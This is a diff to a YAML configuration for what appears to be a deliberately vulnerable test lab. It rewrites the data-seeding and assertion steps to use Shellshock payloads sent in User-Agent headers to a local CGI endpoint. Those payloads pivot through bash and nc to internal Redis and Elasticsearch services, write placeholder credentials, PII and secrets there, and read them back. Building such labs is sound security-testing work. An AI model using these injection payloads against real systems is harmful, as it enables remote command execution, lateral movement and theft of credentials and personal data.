@@ -50,24 +50,30 @@ ready:
   timeout: 120s
   interval: 5s
 
-# Seed internal services with data after ready
+# Seed internal services with data via Shellshock (proves the exploit path
+# works and avoids needing docker compose exec context).
 run:
-  # Seed Redis with credentials
+  # Wait for Elasticsearch to be ready (it takes a while to start).
   - >
-    docker compose exec -T cache redis-cli SET "app:db_url"
-    "postgresql://app:ProductionPassword123@db.internal:5432/myapp"
+    for i in $(seq 1 30); do
+    curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'curl -sf http://search:9200/_cluster/health 2>/dev/null'"
+    http://localhost:9352/cgi-bin/vulnerable | grep -q 'green\|yellow' && break;
+    sleep 3; done
+
+  # Seed Redis with credentials via Shellshock pivot.
   - >
-    docker compose exec -T cache redis-cli SET "app:api_secret"
-    "sk-prod-api-secret-key-never-share-this-value"
-  # Seed Elasticsearch with sample data
+    curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'echo -e \"SET app:db_url postgresql://app:ProductionPassword123@db.internal:5432/myapp\nSET app:api_secret sk-prod-api-secret-key-never-share-this-value\" | nc -w2 cache 6379'"
+    http://localhost:9352/cgi-bin/vulnerable >/dev/null
+
+  # Seed Elasticsearch with sample PII data via Shellshock pivot.
   - >
-    docker compose exec -T webapp bash -c
-    'curl -sf -X PUT http://search:9200/customers/_doc/1 -H "Content-Type: application/json"
-    -d "{\"name\":\"John Doe\",\"email\":\"john@example.com\",\"ssn\":\"123-45-6789\"}" 2>/dev/null || true'
+    curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'curl -sf -X PUT http://search:9200/customers/_doc/1 -H \"Content-Type: application/json\" -d \"{\\\"name\\\":\\\"John Doe\\\",\\\"email\\\":\\\"john@example.com\\\",\\\"ssn\\\":\\\"123-45-6789\\\"}\"'"
+    http://localhost:9352/cgi-bin/vulnerable >/dev/null
+
+  # Seed Elasticsearch with secrets via Shellshock pivot.
   - >
-    docker compose exec -T webapp bash -c
-    'curl -sf -X PUT http://search:9200/secrets/_doc/1 -H "Content-Type: application/json"
-    -d "{\"key\":\"AWS_SECRET\",\"value\":\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"}" 2>/dev/null || true'
+    curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'curl -sf -X PUT http://search:9200/secrets/_doc/1 -H \"Content-Type: application/json\" -d \"{\\\"key\\\":\\\"AWS_SECRET\\\",\\\"value\\\":\\\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\\"}\"'"
+    http://localhost:9352/cgi-bin/vulnerable >/dev/null
 
 assertions:
   # ── Pre-flight: verify command injection works ─────────────────────────
@@ -102,7 +108,7 @@ assertions:
     type: command
     expect:
       command: >
-        curl -s -H "User-Agent: () { :;}; echo; curl -sf http://search:9200/"
+        curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'curl -sf http://search:9200/'"
         http://localhost:9352/cgi-bin/vulnerable | grep -q 'lucene'
       exit_code: 0
       timeout: 15s
@@ -121,7 +127,7 @@ assertions:
     type: command
     expect:
       command: >
-        curl -s -H "User-Agent: () { :;}; echo; curl -sf http://search:9200/customers/_search"
+        curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'curl -sf http://search:9200/customers/_search'"
         http://localhost:9352/cgi-bin/vulnerable | grep -q 'ssn'
       exit_code: 0
       timeout: 15s
